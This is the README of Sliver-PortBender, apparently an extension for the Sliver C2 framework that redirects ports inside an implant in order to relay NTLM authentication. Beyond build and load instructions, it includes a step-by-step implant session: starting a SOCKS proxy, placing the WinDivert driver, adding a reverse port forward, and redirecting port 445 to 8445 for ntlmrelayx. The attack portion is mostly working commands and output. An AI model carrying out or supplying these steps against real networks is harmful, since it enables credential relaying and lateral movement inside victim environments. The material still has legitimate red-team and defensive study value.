# Sliver-PortBender

An **extension to Sliver C2**, written as a **learning excercise**, that allows to **manage multiple redirections of traffic, from port to port, inside the same implant**. 
It maybe useful for performing **NTLM relaying in Sliver** in a similar way to what is described here https://rastamouse.me/ntlm-relaying-via-cobalt-strike/ for Cobalt-Strike. 
**The extension is a DLL wrapping the PortBender Reflective DLL** developed by praetorian-inc here: https://github.com/praetorian-inc/PortBender. Sliver-PortBender performs the same redirection task, 
performed by the original PortBender, but does everything **inside the same implant with no need to inject into other binaries**.

## How it works

The DLL manages multiple threads each one in charge of redirecting traffic from one port to another one. It keeps a map ID -> thread that allows to destroy/create/list the different
threads. For redirection task most of the code was taken from the original PortBender project and it was refactored in order to not crash the implant.
Even if the **backdoor** command appears as a possible argument, it is actually **not available**.

## How to build it

open the solution file using visual studio 2019, and build the x64 release (I didn't test the x86).

## How to load / install it

Until this is potentially included in the armory it can be built on a windows system and loaded manually in sliver.
Create a directory called sliver-extension and copy inside it SliverPortBender.dll, the binary previously compiled on windows with visual studio, and extension.json:
```
$ mkdir sliver-extension && cd sliver-extension
$ cp /path/to/extension.json .
$ cp /path/to/SliverPortBender.dll .
```

Install and load the extension in sliver-client:
```
> extension install /path/to/sliver-extension
> extension load /path/to/sliver-extension
```

## Usage

By running `portbender` you can already get a help message. Here the functionalities:

- `portbender redirect <fakeDstPort> <redirectedPort>` . Redirects the traffic from `<fakeDstPort>` to `<redirectedPort>`
- `portbender list` . List the active redirection rules created with the `redirect command`
- `portbender remove <id>` . Stop and remove a redirection rule with a given `<id>`. The `<id>` is retrieved through the `portbender list`command.

## Example

Here how to use Sliver-Portbender in sliver in order to redirect traffic from port 445 to port 8445 and then relay incoming traffic with ntlmrelayx in the internal network.
Be careful It is first necessary to upload `WinDivert64.sys` in the pivot machine to the path `C:\Windows\System32\drivers`. Later it is necessary to change directory to `C:\Windows\System32\drivers`.

Creating socks proxy, port forwarding rule and portbender rule in session:

```

[*] Active session RIPE_COUNCILOR (2aff286b-da8d-4636-8f8e-8512f67ab64e)

sliver (RIPE_COUNCILOR) > socks5 start -P 1080

[*] Started SOCKS5 127.0.0.1 1080
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol

sliver (RIPE_COUNCILOR) > cd C:\\Windows\\System32\\Drivers

[*] C:\Windows\System32\Drivers

sliver (RIPE_COUNCILOR) > ls WinDivert64.sys

C:\Windows\System32\Drivers (1 item, 37.0 KiB)
==============================================
-rw-rw-rw-  WinDivert64.sys  37.0 KiB  Sun Dec 11 21:20:20 +0100 2022


sliver (RIPE_COUNCILOR) > rportfwd add -b 0.0.0.0:8445 -r 192.168.161.50:445

[*] Reverse port forwarding 192.168.161.50:445 <- 0.0.0.0:8445

sliver (RIPE_COUNCILOR) > portbender redirect 445 8445

[*] Successfully executed portbender
[*] Got output:
Initializing manager...
Creating redirection with id 0...
Redirection created successfully


sliver (RIPE_COUNCILOR) > portbender list

[*] Successfully executed portbender
[*] Got output:
        id:     ORIGINAL_PORT -> REDIRECTED_PORT        MODE(0=redirect,1=backdoor)     PASSWORD
        0:      445 -> 8445     0


sliver (RIPE_COUNCILOR) > 
```

